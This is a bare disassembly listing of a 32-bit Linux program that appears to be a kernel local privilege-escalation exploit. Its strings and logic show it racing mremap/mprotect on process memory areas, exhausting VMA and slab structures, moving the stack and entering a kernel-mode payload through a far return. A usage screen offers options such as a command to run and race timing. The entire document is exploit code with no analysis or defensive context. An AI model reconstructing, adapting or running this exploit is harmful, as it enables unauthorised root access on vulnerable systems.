sub esp, 8
push 0x1000
push dword [0x8050538]
call fcn.08048e58
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
je 0x8049e78
sub esp, 8
push 0
push str.munmap_2
call fcn.08048f7c
add esp, 0x10
sub esp, 8
push 0
push 0x8050554
call fcn.08048e14
add esp, 0x10
mov esi, esi
call fcn.08048edc
sub esp, 8
push 0
push 0x805055c
call fcn.08048e14
add esp, 0x10
sub esp, 8
push 0x805055c
push 0x8050554
call fcn.08048f10
add esp, 0x10
mov eax, eax
mov dword [0x804b034], eax
mov edx, dword [0x804b050]
mov eax, edx
shl eax, 2
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
lea edx, [eax*4]
add eax, edx
mov edx, eax
shl edx, 6
mov eax, dword [0x804b034]
cmp edx, eax
ja 0x8049e8c
mov dword [0x804b03c], 4
call fcn.08049bb0
mov eax, dword [0x804b03c]
test eax, eax
jne 0x8049f40
sub esp, 0xc
push str._n_VMAs_reversed
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 4
mov eax, dword [0x804b03c]
or eax, 1
push eax
push 0x3000
mov eax, dword [0x8050538]
add eax, 0x1000
push eax
call fcn.08048d84
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0xffffffff
jne 0x8049f81
sub esp, 8
push 0
push str.mprotect_brk
call fcn.08048f7c
add esp, 0x10
mov eax, dword [0x8050538]
mov edx, eax
neg edx
mov eax, 0x4000
neg eax
sub eax, 0x1000
lea eax, [eax + edx]
mov dword [var_8h], eax
sub esp, 4
push 0
push 0x3000
mov eax, dword [0x8050538]
add eax, 0x1000
push eax
call fcn.08048d3c
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
je 0x8049fd6
sub esp, 8
push 0
push str.madvise
call fcn.08048f7c
add esp, 0x10
sub esp, 0xc
push 0
push 1
push dword [var_8h]
push 0x1000
mov eax, dword [0x8050538]
add eax, 0x3000
push eax
call fcn.08048ce8
add esp, 0x20
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0xffffffff
jne 0x804a030
cmp dword [var_8h], 0
jne 0x804a020
sub esp, 8
push 0
push str.mremap:_expand_VMA
call fcn.08048f7c
add esp, 0x10
jmp 0x804a030
lea esi, [esi]
lea eax, [var_8h]
sub dword [eax], 0x1000
jmp 0x8049f9c
mov esi, esi
mov eax, dword [0x8050538]
add eax, 0x1000
mov dword [0x8050548], eax
mov eax, dword [var_8h]
add eax, dword [0x8050548]
add eax, 0x2000
mov dword [0x805054c], eax
sub esp, 4
push dword [0x805054c]
push dword [0x8050548]
push str._n_expanded_VMA__0x_.8x_0x_.8x_
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 8
push fcn.08049b70
push 0x11
call fcn.080489e0
add esp, 0x10
sub esp, 8
push fcn.08049b58
push 0xb
call fcn.080489e0
add esp, 0x10
sub esp, 8
push fcn.08049b58
push 7
call fcn.080489e0
add esp, 0x10
call fcn.0804981c
sub esp, 8
push 0
push str.try_again
call fcn.08048f7c
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
sub esp, 8
and dword [0x8050534], 0xfffff000
sub dword [0x8050534], 0x1000
mov eax, dword [0x8050534]
add eax, 0x40000000
shr eax, 0x1e
mov eax, eax
shl eax, 0x1e
mov dword [0x8050530], eax
sub esp, 8
mov edx, dword [0x8050534]
mov eax, dword [0x8050530]
sub eax, edx
push eax
push dword [0x8050534]
call fcn.08048e58
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
je 0x804a2a1
sub esp, 8
push 0
push str.unmap_stack
call fcn.08048f7c
add esp, 0x10
call fcn.08048ae0
mov dword [0x805052c], eax
mov eax, 0x4000
neg eax
sub eax, 0x1000
add eax, dword [0x8050530]
mov dword [0x8050538], eax
cmp dword [0x804b058], 0
je 0x804a2d8
mov eax, dword [0x804b058]
mov dword [0x805053c], eax
jmp 0x804a2f6
nop
mov eax, dword [0x8050538]
sub eax, 0x400000
and eax, 0xffc00000
mov dword [0x805053c], eax
mov eax, dword [0x805053c]
mov dword [0x804b058], eax
push dword [0x804b058]
push dword [0x8050530]
push dword [0x8050534]
push str._n___moved_stack__x__task_size0x_.8x__map_base0x_.8x
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 0xc
push 0x804c2e0
call fcn.08048a90
add esp, 0x10
mov eax, dword [0x804c2f0]
add eax, dword [0x8050530]
mov dword [0x8050540], eax
mov eax, dword [0x8050540]
add eax, 0x3fffff
and eax, 0xffc00000
mov dword [0x8050540], eax
mov eax, dword [0x804c2f0]
add eax, dword [0x8050540]
mov dword [0x8050544], eax
cmp dword [0x8050544], 0xffffdfff
ja 0x804a388
mov eax, dword [0x8050544]
cmp eax, dword [0x8050540]
jb 0x804a388
jmp 0x804a392
lea esi, [esi]
mov dword [0x8050544], 0xffffd000
sub esp, 4
push dword [0x8050544]
push dword [0x8050540]
push str._n___vmalloc_area_0x_.8x___0x_.8x
call fcn.08048ad0
add esp, 0x10
mov edx, dword [0x8050540]
mov eax, dword [0x8050544]
sub eax, edx
shr eax, 0xc
mov dword [0x8050550], eax
sub esp, 0xc
mov eax, dword [0x8050550]
add eax, 0x20
push eax
call fcn.08048a30
add esp, 0x10
mov eax, eax
mov dword [0x8050564], eax
cmp dword [0x8050564], 0
jne 0x804a3f9
sub esp, 8
push 1
push str.malloc_pagemap
call fcn.08048f7c
add esp, 0x10
sub esp, 4
mov eax, dword [0x8050550]
add eax, 0x20
push eax
push 0
push dword [0x8050564]
call fcn.08048b50
add esp, 0x10
call fcn.0804a0d0
call fcn.08049bf8
leave
ret
jmp dword [reloc.getppid]
jmp dword [reloc.pause]
jmp dword [reloc.fork]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], 0
mov dword [var_ch], 0
mov dword [0x8050534], esp
mov eax, dword [0x8050534]
sub eax, 0x3fffff
and eax, 0xffc00000
mov dword [0x8050534], eax
mov eax, dword [0x804b058]
mov dword [var_10h], eax
cmp dword [0x804b058], 0
jne 0x804a4e3
mov eax, dword [0x8050534]
mov dword [var_10h], eax
mov eax, dword [var_10h]
mov dword [0x8050534], eax
nop
cmp dword [var_ch], 0
jg 0x804a507
sub esp, 0xc
push str.vm_area_struct
call fcn.080499a8
add esp, 0x10
mov eax, eax
mov dword [var_ch], eax
cmp dword [var_ch], 0x80
jg 0x804a518
jmp 0x804a5c8
lea esi, [esi]
lea eax, [var_ch]
dec dword [eax]
mov eax, dword [0x804b03c]
xor eax, 1
mov dword [0x804b03c], eax
sub dword [0x8050534], 0x1000
sub esp, 8
push 0
push 0
push 0x32
mov eax, dword [0x804b03c]
push eax
push 0x1000
push dword [0x8050534]
call fcn.08048c90
add esp, 0x20
mov dword [var_4h], eax
cmp dword [var_4h], 0xffffffff
jne 0x804a564
jmp 0x804a5c8
lea esi, [esi]
cmp dword [var_8h], 0x7ffffffe
jle 0x804a570
jmp 0x804a5c8
nop
mov eax, dword [var_8h]
and eax, 0x3ff
test eax, eax
jne 0x804a5bc
cmp dword [var_8h], 0
jne 0x804a592
sub esp, 0xc
push 0x804aa81
call fcn.08048ad0
add esp, 0x10
sub esp, 4
push dword [var_8h]
mov eax, dword [0x804b020]
push eax
push str._r_child__d_VMAs__d
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
lea eax, [var_8h]
inc dword [eax]
jmp 0x804a4ec
mov esi, esi
sub esp, 4
push dword [var_8h]
mov eax, dword [0x804b020]
push eax
push str._r_child__d_VMAs__d
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 8
push 0xa
sub esp, 4
call fcn.08048a40
add esp, 4
mov eax, eax
push eax
call fcn.08048b80
add esp, 0x10
lea esi, [esi]
call fcn.08048ab0
jmp 0x804a610
jmp dword [reloc.getopt]
jmp dword [reloc.atoi]
jmp dword [reloc.strdup]
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push dword [arg_8h]
push str._nUsage:__s_t_f_forced_stop_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push str._t_t_s_silent_mode_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push str._t_t_c_command_to_run_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push str._t_t_n_SMP_iterations_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push str._t_t_d_race_delta_us_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push str._t_t_w_wait_time_seconds_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push str._t_t_l_alternate_lib_name_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push str._t_t_a_alternate_addr_hex_n
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push 0x804aa81
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push 1
call fcn.08048b60
nop
jmp dword [reloc.setpgrp]
push ebp
mov ebp, esp
sub esp, 8
sub esp, 8
push fcn.0804a48c
push 0xa
call fcn.080489e0
add esp, 0x10
sub esp, 0xc
push str._n___SLAB_cleanup
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
lea esi, [esi]
mov dword [0x804b030], 0
mov eax, dword [0x804b020]
inc eax
mov dword [0x804b020], eax
call fcn.080489c0
mov eax, eax
mov dword [0x8050528], eax
cmp dword [0x8050528], 0
jne 0x804a683
call fcn.0804a49c
nop
mov eax, dword [0x804b030]
test eax, eax
je 0x804a690
jmp 0x804a698
nop
call fcn.08048edc
jmp 0x804a684
nop
sub esp, 0xc
push str.vm_area_struct
call fcn.080499a8
add esp, 0x10
mov eax, eax
cmp eax, 0x80
jg 0x804a654
sub esp, 8
push 0
push 0xa
call fcn.080489e0
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], 0
mov dword [reloc.__environ], 0x804b05c
sub esp, 8
push 0
push 0
push 0x22
push 3
push 0x4000
push 0
call fcn.08048c90
add esp, 0x20
mov dword [var_4h], eax
cmp dword [var_4h], 0xffffffff
jne 0x804a470
sub esp, 8
push 0
push str.mmap2_stack
call fcn.08048f7c
add esp, 0x10
lea eax, [var_4h]
add dword [eax], 0x3fc0
mov dword [0x8050534], esp
mov esp, dword [var_4h]
call fcn.0804a234
leave
ret
pop ebx
add ebx, 0x822
lea esi, [esi]
call fcn.08048be0
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [0x804b00c]
test edx, edx
jne 0x8048c39
mov edx, dword [0x804b008]
mov eax, dword [edx]
test eax, eax
je 0x8048c16
lea esi, [esi]
lea eax, [edx + 4]
mov dword [0x804b008], eax
call dword [edx]
mov edx, dword [0x804b008]
mov ecx, dword [edx]
test ecx, ecx
jne 0x8048c00
mov eax, fcn.08048a50
test eax, eax
je 0x8048c2f
sub esp, 0xc
push section..eh_frame
call fcn.08048a50
add esp, 0x10
mov eax, 1
mov dword [0x804b00c], eax
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
call fcn.08048bb4
nop
call fcn.08048c50
call fcn.0804a950
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [0x804b028], 1
call fcn.08048a20
mov eax, eax
mov eax, eax
mov dword [eax], 0
mov eax, dword [0x804b024]
test eax, eax
jne 0x80490b1
call fcn.08048edc
sub esp, 8
push 0
push 0x805055c
call fcn.08048e14
add esp, 0x10
sub esp, 8
push 0x805055c
push 0x8050554
call fcn.08048f10
add esp, 0x10
mov eax, eax
mov dword [0x804b034], eax
cmp dword [0x804b04c], 0
jne 0x80490fc
mov edx, dword [0x804b034]
mov eax, dword [0x804b038]
cmp edx, eax
jae 0x80490fc
jmp 0x80490a3
lea esi, [esi]
mov eax, dword [0x804b04c]
mov dword [0x8050524], eax
sub esp, 4
push 0
push 0x1000
push dword [0x8050538]
call fcn.08048d3c
add esp, 0x10
mov eax, eax
mov dword [0x804b020], eax
mov eax, dword [0x804b020]
test eax, eax
je 0x8049134
jmp 0x8049094
nop
call fcn.08048a20
mov eax, eax
mov eax, eax
mov dword [eax], 0
sub esp, 4
push 0
push 0x3000
mov eax, dword [0x8050538]
add eax, 0x1000
push eax
call fcn.08048d3c
add esp, 0x10
mov eax, eax
mov dword [0x804b020], eax
mov eax, dword [0x804b020]
test eax, eax
je 0x8049094
mov eax, dword [0x804b020]
test eax, eax
jns 0x804918f
call fcn.08048a20
mov eax, eax
mov eax, eax
cmp dword [eax], 0xc
jne 0x8049094
dec dword [0x8050524]
cmp dword [0x8050524], 0
js 0x80491a4
jmp 0x8049106
nop
mov eax, dword [0x804b024]
test eax, eax
jne 0x80491b4
jmp 0x8049094
mov esi, esi
mov eax, dword [0x804b028]
inc eax
mov dword [0x804b028], eax
sub esp, 4
mov eax, dword [0x804b03c]
push eax
push 0x1000
push dword [0x805053c]
call fcn.08048d84
add esp, 0x10
mov eax, eax
mov dword [0x804b020], eax
mov eax, dword [0x804b020]
test eax, eax
je 0x80491fd
sub esp, 8
push 0
push str.mprotect
call fcn.08048f7c
add esp, 0x10
sub esp, 8
push 0
push 0
push 0x32
push 0
push 0x3000
mov eax, dword [0x8050538]
add eax, 0x1000
push eax
call fcn.08048c90
add esp, 0x20
mov eax, eax
mov dword [0x804b020], eax
mov eax, dword [0x804b020]
cmp eax, 0xffffffff
jne 0x8049243
sub esp, 8
push 0
push str.mmap2_race
call fcn.08048f7c
add esp, 0x10
sub esp, 8
push dword [0x804b054]
push str._n___race_won_maps_d
call fcn.08048ad0
add esp, 0x10
sub esp, 0xc
push dword [reloc.stdout]
call fcn.080489f0
add esp, 0x10
sub esp, 0xc
push 0
call fcn.08048b60
push ebp
mov ebp, esp
pushal
push es
push ds
mov edx, 0xfff4
mov es, edx
mov ds, edx
mov eax, 0xffffe000
and eax, esp
push eax
call fcn.0804934c
add esp, 4
pop ds
pop es
popal
retf
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x804b02c]
inc eax
mov dword [0x804b02c], eax
call fcn.080497bc
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x804b030]
inc eax
mov dword [0x804b030], eax
sub esp, 4
push 3
lea edx, [arg_8h]
mov eax, edx
push eax
push 0
call fcn.08048a60
add esp, 0x10
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [0x804b03c], 0
call fcn.08049bb0
leave
ret
push ebp
mov ebp, esp
mov eax, dword [0x804b030]
inc eax
mov dword [0x804b030], eax
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
push edx
call fcn.0804a99a
